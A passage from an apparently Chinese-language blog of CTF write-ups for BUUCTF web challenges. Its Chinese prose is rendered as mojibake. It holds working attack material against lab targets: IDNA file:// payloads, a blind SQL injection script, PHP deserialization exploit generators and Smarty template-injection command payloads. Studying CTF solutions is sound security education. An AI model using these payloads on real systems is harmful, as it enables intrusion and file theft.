class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œäº†ä¸‰æ¬¡åˆ¤æ–­ï¼Œæœ€åä¸€æ¬¡è¿‡äº†ä¹‹åæ‰ä¼šæ‰§è¡Œè¯»å–æ–‡ä»¶çš„æ“ä½œã€‚</p><p>é—®é¢˜å°±å‡ºç°åœ¨ç¬¬äºŒæ¬¡å’Œç¬¬ä¸‰æ¬¡åˆ¤æ–­çš„ä¸­é—´ï¼š<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code></p><p>æ‰€ä»¥åœ¨ç¬¬ä¸‰ä¸ªå¿…é¡»ç­‰äºsuctf.cc</p><p>å¯ç”¨payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.câ„­/usr/local/nginx/conf/nginx.conf</span><br><span class="line">file://sucâ“‰f.cc/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><h1 id="0x35-MRCTF2020-PYWebsite"><a href="#0x35-MRCTF2020-PYWebsite" class="headerlink" title="0x35.[MRCTF2020]PYWebsite"></a>0x35.[MRCTF2020]PYWebsite</h1><p>çœ‹æºç å‘ç°æœ‰å‰æ®µçš„éªŒè¯(æ²¡åµç”¨)ï¼Œflag.phpè¿›å»ä¹‹åæç¤º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;æ‹œæ‰˜ï¼Œæˆ‘ä¹Ÿæ˜¯å­¦è¿‡åŠå°æ—¶ç½‘ç»œå®‰å…¨çš„ï¼Œä½ éª—ä¸äº†æˆ‘ï¼&lt;/h1&gt;&lt;p&gt;æˆ‘å·²ç»æŠŠè´­ä¹°è€…çš„IPä¿å­˜äº†ï¼Œæ˜¾ç„¶ä½ æ²¡æœ‰è´­ä¹°&lt;/p&gt;&lt;p&gt;éªŒè¯é€»è¾‘æ˜¯åœ¨åç«¯çš„ï¼Œé™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag&lt;/p&gt;&lt;a href=&quot;index.html&quot; &gt;è¿˜ä¸å¿«å»ä¹°&lt;/p&gt;&lt;</span><br></pre></td></tr></table></figure><p>çœŸæ­£çš„éªŒè¯åœ¨åç«¯ã€‚</p><p>è´­ä¹°è€…å’Œè‡ªå·±ï¼Œå¯ä»¥ä¼ªé€ æˆæœ¬åœ°è®¿é—®ï¼ŒåŠ X-Forwarded-Forå¤´å¾—åˆ°flag</p><h1 id="0x36-æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL-ç›²æ³¨"><a href="#0x36-æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL-ç›²æ³¨" class="headerlink" title="0x36.[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL(ç›²æ³¨)"></a>0x36.[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL(ç›²æ³¨)</h1><p>ä¾æ¬¡ç‚¹12345ï¼Œç„¶åæµ‹è¯•id=6çš„æ—¶å€™è¿”å›<code>Clever! But not this table.</code>ï¼Œ7ä»¥ä¸ŠæŠ¥error</p><p>æ³¨å…¥ç‚¹åœ¨idï¼Œè¿‡æ»¤äº†ä¸€éƒ¨åˆ†å†…å®¹ï¼Œç›²æ³¨ï¼Œç›´æ¥ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b392895c-24a8-4369-9d79-e4d112a0d249.node4.buuoj.cn:81/search.php?id=&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span></span><br><span class="line">    begin = <span class="number">32</span></span><br><span class="line">    end = <span class="number">126</span></span><br><span class="line">    tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">        <span class="comment">#print(begin, tmp, end)</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># çˆ†æ•°æ®åº“:geek</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27;&#x27;or(ascii(substr(database(),%d,1))&gt;%d)&quot; % (i, tmp)</span></span><br><span class="line">        <span class="comment"># çˆ†è¡¨: F1naI1y,Flaaaaag</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;&#x27;or(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),%d,1))&gt;%d)&quot; % (i, tmp)</span></span><br><span class="line">        <span class="comment"># çˆ†å­—æ®µ</span></span><br><span class="line">        <span class="comment"># F1naI1y: id,username,password</span></span><br><span class="line">        <span class="comment"># Flaaaaag:id,fl4gawsl</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27;&#x27;or(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;Flaaaaag&#x27;)),%d,1))&gt;%d)&quot; % (i, tmp)</span></span><br><span class="line">        <span class="comment"># çˆ†flag è¦è·‘å¾ˆä¹…</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;&#x27;or(ascii(substr((select(group_concat(username))from(F1naI1y)),%d,1))&gt;%d)&quot;</span> % (i, tmp)</span><br><span class="line">        <span class="comment"># çˆ†flag å¾ˆå¿«</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;&#x27;or(ascii(substr((select(password)from(F1naI1y)where(username=&#x27;flag&#x27;)),%d,1))&gt;%d)&quot; % (i, tmp)</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            begin = tmp + <span class="number">1</span></span><br><span class="line">            tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = tmp</span><br><span class="line">            tmp = (begin + end) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    flag += <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> begin == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>passwordé‡Œé¢åƒåœ¾ä¸œè¥¿å¾ˆå¤šï¼Œå¯ä»¥å…ˆæŸ¥usernameç„¶åæŸ¥password</p><h1 id="0x37-MRCTF2020-Ezpop"><a href="#0x37-MRCTF2020-Ezpop" class="headerlink" title="0x37.[MRCTF2020]Ezpop"></a>0x37.[MRCTF2020]Ezpop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨</span></span><br><span class="line">__destruct() <span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">__toString() <span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span></span><br><span class="line">__sleep()<span class="comment">//åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span></span><br><span class="line">__wakeup()<span class="comment">//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨(é€šè¿‡åºåˆ—åŒ–å¯¹è±¡å…ƒç´ ä¸ªæ•°ä¸ç¬¦æ¥ç»•è¿‡)</span></span><br><span class="line">__get()<span class="comment">//è®¿é—®ç±»ä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line">__set()<span class="comment">//è®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</span></span><br><span class="line">__invoke()<span class="comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span></span><br><span class="line">__call()<span class="comment">//å½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­çš„ä¸èƒ½ç”¨çš„æ–¹æ³•çš„æ—¶å€™å°±ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°</span></span><br><span class="line">æ­¤å¤„ç”¨åˆ°çš„ä¸»è¦æ˜¯__toString()ï¼Œ__wakeup()ï¼Œ__get()ï¼Œ__invoke()ï¼Œ</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯Modifierç±»ï¼Œappendå¯ä»¥åŒ…å«æ–‡ä»¶ï¼Œ<code>__invoke</code>ä¸­è°ƒç”¨äº†appendæ–¹æ³•ï¼Œ<code>__invoke</code>è‡ªåŠ¨è°ƒç”¨çš„æ¡ä»¶æ˜¯ç±»è¢«å½“åšä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯Testï¼Œconstructç”¨ä¸ä¸Š ï¼Œç›´æ¥çœ‹getï¼Œå¯ä»¥çœ‹åˆ°pè¢«å½“åšå‡½æ•°æ¥è°ƒç”¨ï¼Œæ­£å¥½ç¬¦åˆModifierçš„è¦æ±‚ã€‚é­”æ³•å‡½æ•°__getä¼šåœ¨è®¿é—®ç±»ä¸­ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚</p><p>ç„¶åæ˜¯Showç±»ï¼Œé­”æœ¯æ–¹æ³•__toStringä¸­ä¼šè¿”å›å±æ€§strä¸­çš„å±æ€§sourceï¼Œå¦‚æœåˆšåˆšæåˆ°çš„sourceå±æ€§ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå°±ç¬¦åˆäº†Testç±»ä¸­çš„è¦æ±‚ï¼Œé­”æœ¯æ–¹æ³•__toStringåœ¨ç±»è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²å¤„ç†æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p><p>wakewpå°†sourceä¼ å…¥æ­£åˆ™è¿›è¡ŒåŒ¹é…ï¼Œè¿™æ—¶sourceè¢«å½“åšå­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œæœ€ç»ˆä¼šè°ƒç”¨tostringæ–¹æ³•</p><p>äºæ˜¯ï¼š<code>ååºåˆ—åŒ–-&gt; show.__wakeup-&gt; show.tostring-&gt;test.get-&gt;modiflier.invoke-&gt;include</code></p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="comment">///protected  $var=&quot;flag.php&quot;;</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str=<span class="keyword">new</span> Test();</span><br><span class="line">(<span class="variable">$b</span>-&gt;str)-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x38-NPUCTF2020-ReadlezPHP"><a href="#0x38-NPUCTF2020-ReadlezPHP" class="headerlink" title="0x38.[NPUCTF2020]ReadlezPHP"></a>0x38.[NPUCTF2020]ReadlezPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"><span class="number">2021</span>-<span class="number">10</span>-<span class="number">05</span> <span class="number">10</span>:<span class="number">21</span>:<span class="number">03</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x39-CISCN2019-åä¸œå—èµ›åŒº-Web11-SSTI"><a href="#0x39-CISCN2019-åä¸œå—èµ›åŒº-Web11-SSTI" class="headerlink" title="0x39.[CISCN2019 åä¸œå—èµ›åŒº]Web11(SSTI)"></a>0x39.[CISCN2019 åä¸œå—èµ›åŒº]Web11(SSTI)</h1><p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20211005183401519.png" alt="image-20211005183401519"></p><p>æŠ“åŒ…æ”¹ä¸‹xffï¼Œç¡®å®æœ‰ç”¨ã€‚</p><p>çœ‹äº†wpè¯´æ˜¯Smarty SSTIï¼ŒSmarty æ˜¯ä¸€ä¸ª PHP çš„æ¨¡æ¿å¼•æ“ã€‚</p><p>æŸ¥çœ‹ Smarty ç‰ˆæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure><p> <strong>æ¼æ´åˆ©ç”¨</strong></p><p>ä¸åŒç‰ˆæœ¬å¯ä»¥åˆ©ç”¨çš„æ–¹å¼ä¸åŒï¼Œå¸¸ç”¨çš„æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼š</p><p>1.æ—§ç‰ˆ Smarty æ”¯æŒä½¿ç”¨{php}{/php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„ php æŒ‡ä»¤ã€‚</p><p>Smarty3 çš„å®˜æ–¹æ‰‹å†Œæè¿°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smartyå·²ç»åºŸå¼ƒ&#123;php&#125;æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ&#123;php&#125;ä»…åœ¨SmartyBCä¸­å¯ç”¨</span><br></pre></td></tr></table></figure><p>2.æ—§ç‰ˆ Smarty å¯ä»¥é€šè¿‡ self è·å– Smarty ç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™</p><p>3.PHP å‡½æ•°éƒ½å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ï¼Œå› æ­¤æ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#x27;ls&#x27;)&#125;</span><br></pre></td></tr></table></figure><p>ä¾¿å¯éšæ„æ‰§è¡Œå‘½ä»¤ï¼›æ‰§è¡Œå¤šæ¡è¯­å¥çš„è¯å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#x27;ls&#x27;)&#125;&#123;system(&#x27;cat index.php&#x27;)&#125;</span><br></pre></td></tr></table></figure><p>æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}. ä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}. å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ã€‚<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æŠŠphpä»£ç å†™åœ¨<code>&#123;if PHPä»£ç &#125;&#123;/if&#125;</code> 